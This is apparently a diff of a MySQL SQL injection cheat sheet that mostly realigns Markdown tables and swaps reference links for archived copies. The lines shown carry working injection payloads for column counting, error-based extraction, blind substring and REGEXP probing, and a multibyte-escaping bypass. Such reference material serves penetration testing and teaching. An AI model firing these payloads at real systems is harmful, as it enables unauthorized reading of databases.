@@ -51,9 +51,9 @@
 
 ## MYSQL Default Databases
 
-| Name               | Description              |
-|--------------------|--------------------------|
-| mysql              | Requires root privileges |
+| Name               | Description                         |
+| ------------------ | ----------------------------------- |
+| mysql              | Requires root privileges            |
 | information_schema | Available from version 5 and higher |
 
 ## MYSQL Comments
@@ -61,7 +61,7 @@
 MySQL comments are annotations in SQL code that are ignored by the MySQL server during execution.
 
 | Type                       | Description                       |
-|----------------------------|-----------------------------------|
+| -------------------------- | --------------------------------- |
 | `#`                        | Hash comment                      |
 | `/* MYSQL Comment */`      | C-style comment                   |
 | `/*! MYSQL Special SQL */` | Special SQL                       |
@@ -148,11 +148,11 @@ ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
 
 This method is effective when error reporting is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause.
 
-| Payload                      | Error           |
-| ---------------------------- | --------------- |
+| Payload                      | Error                                                           |
+| ---------------------------- | --------------------------------------------------------------- |
 | `1' LIMIT 1,1 INTO @--+`     | `The used SELECT statements have a different number of columns` |
-| `1' LIMIT 1,1 INTO @,@--+`  | `The used SELECT statements have a different number of columns` |
-| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns` |
+| `1' LIMIT 1,1 INTO @,@--+`   | `The used SELECT statements have a different number of columns` |
+| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns`                           |
 
 Since the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.
 
@@ -186,18 +186,18 @@ UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
 
 Method for `MySQL >= 4.1`.
 
-| Payload | Output |
-| --- | --- |
-| `(1)and(SELECT * from db.users)=(1)` | Operand should contain **4** column(s) |
-| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null |
+| Payload                                                                   | Output                                 |
+| ------------------------------------------------------------------------- | -------------------------------------- |
+| `(1)and(SELECT * from db.users)=(1)`                                      | Operand should contain **4** column(s) |
+| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null         |
 
 Method for `MySQL 5`
 
-| Payload | Output |
-| --- | --- |
-| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | Duplicate column name '**id**' |
-| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | Duplicate column name '**name**' |
-| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data |
+| Payload                                                                  | Output                           |
+| ------------------------------------------------------------------------ | -------------------------------- |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a`                | Duplicate column name '**id**'   |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a`      | Duplicate column name '**name**' |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data                             |
 
 ### Extract Data Without Columns Name
 
@@ -220,16 +220,16 @@ MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SE
 
 ## MYSQL Error Based
 
-| Name         | Payload         |
-| ------------ | --------------- |
-| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |
+| Name         | Payload                                                                                        |
+| ------------ | ---------------------------------------------------------------------------------------------- |
+| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -`                                |
 | JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
-| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |
-| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |
-| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |
-| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |
-| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |
-| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1` |
+| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -`                           |
+| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -`                        |
+| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -`              |
+| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -`         |
+| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--`          |
+| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1`                                                                |
 
 ### MYSQL Error Based - Basic
 
@@ -283,13 +283,13 @@ Works with `MySQL >= 5.0`
 
 ### MYSQL Blind With Substring Equivalent
 
-| Function | Example | Description |
-| --- | --- | --- |
-| `SUBSTR` | `SUBSTR(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |
-| `SUBSTRING` | `SUBSTRING(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |
-| `RIGHT` | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |
-| `MID` | `MID(version(),1,1)=4` | Extracts a substring from a string (starting at any position) |
-| `LEFT` | `LEFT(version(),1)=4` | Extracts a number of characters from a string (starting from left) |
+| Function    | Example                        | Description                                                         |
+| ----------- | ------------------------------ | ------------------------------------------------------------------- |
+| `SUBSTR`    | `SUBSTR(version(),1,1)=5`      | Extracts a substring from a string (starting at any position)       |
+| `SUBSTRING` | `SUBSTRING(version(),1,1)=5`   | Extracts a substring from a string (starting at any position)       |
+| `RIGHT`     | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |
+| `MID`       | `MID(version(),1,1)=4`         | Extracts a substring from a string (starting at any position)       |
+| `LEFT`      | `LEFT(version(),1)=4`          | Extracts a number of characters from a string (starting from left)  |
 
 Examples of Blind SQL injection using `SUBSTRING` or another equivalent function:
 
@@ -344,11 +344,11 @@ SELECT * FROM products WHERE product_name LIKE '%user_input%'
 
 Blind SQL injection can also be performed using the MySQL `REGEXP` operator, which is used for matching a string against a regular expression. This technique is particularly useful when attackers want to perform more complex pattern matching than what the `LIKE` operator can offer.
 
-| Payload | Description |
-| --- | --- |
-| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length |
+| Payload                                                                | Description                         |
+| ---------------------------------------------------------------------- | ----------------------------------- |
+| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length                     |
 | `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits |
-| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by "a" |
+| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by "a"   |
 
 ## MYSQL Time Based
 
@@ -483,11 +483,11 @@ The `PROCESSLIST` table contains several important columns, each providing detai
 SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
 ```
 
-| ID  | USER      | HOST           | DB     | COMMAND | TIME | STATE      | INFO |
-| --- | --------- | ---------------- | ------- | ------- | ---- | ---------- | ---- |
-| 1   | root   | localhost        | testdb  | Query  | 10 | executing  | SELECT * FROM some_table |
-| 2   | app_uset  | 192.168.0.101    | appdb   | Sleep  | 300 | sleeping  | NULL |
-| 3   | gues_user | example.com:3360 | NULL    | Connect | 0    | connecting | NULL |
+| ID  | USER      | HOST             | DB     | COMMAND | TIME | STATE      | INFO                     |
+| --- | --------- | ---------------- | ------ | ------- | ---- | ---------- | ------------------------ |
+| 1   | root      | localhost        | testdb | Query   | 10   | executing  | SELECT * FROM some_table |
+| 2   | app_uset  | 192.168.0.101    | appdb  | Sleep   | 300  | sleeping   | NULL                     |
+| 3   | gues_user | example.com:3360 | NULL   | Connect | 0    | connecting | NULL                     |
 
 ```sql
 UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
@@ -763,13 +763,13 @@ Therefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the back
 ## References
 
 * [[SQLi] Extracting data without knowing columns names - Ahmed Sultan - February 9, 2019](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
-* [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection - Marc Olivier Bergeron - October 19, 2021](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
-* [Alternative for Information_Schema.Tables in MySQL - Osanda Malith Jayathissa - February 3, 2017](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
+* [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection - Marc Olivier Bergeron - October 19, 2021](https://web.archive.org/web/20211019152624/https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
+* [Alternative for Information_Schema.Tables in MySQL - Osanda Malith Jayathissa - February 3, 2017](https://web.archive.org/web/20260227032450/https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
 * [Ekoparty CTF 2016 (Web 100) - p4-team - October 26, 2016](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)
-* [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased)
-* [How to Use SQL Calls to Secure Your Web Site - IPA ISEC - March 2010](https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf)
-* [MySQL Out of Band Hacking - Osanda Malith Jayathissa - February 23, 2018](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
-* [SQL injection - The oldschool way - 02 - Ahmed Sultan - January 1, 2025](https://www.youtube.com/watch?v=u91EdO1cDak)
-* [SQL Truncation Attack - Rohit Shaw - June 29, 2014](https://resources.infosecinstitute.com/sql-truncation-attack/)
-* [SQLi filter evasion cheat sheet (MySQL) - Johannes Dahse - December 4, 2010](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
+* [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://web.archive.org/web/20210215172533/https://sqlwiki.netspi.com/injectionTypes/errorBased/)
+* [How to Use SQL Calls to Secure Your Web Site - IPA ISEC - January 18, 2024](https://web.archive.org/web/20240118024024/https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf)
+* [MySQL Out of Band Hacking - Osanda Malith Jayathissa - February 23, 2018](https://web.archive.org/web/20260303030701/https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
+* [SQL injection - The oldschool way - 02 - Ahmed Sultan - January 1, 2025](https://web.archive.org/web/20250807062504/https://www.youtube.com/watch?si=kFQkvCEn2NiWLDGY&v=u91EdO1cDak&feature=youtu.be)
+* [SQL Truncation Attack - Rohit Shaw - June 29, 2014](https://web.archive.org/web/20201001181524/https://resources.infosecinstitute.com/sql-truncation-attack/)
+* [SQLi filter evasion cheat sheet (MySQL) - Johannes Dahse - December 4, 2010](https://web.archive.org/web/20101209155346/http://websec.wordpress.com:80/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql)
 * [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)
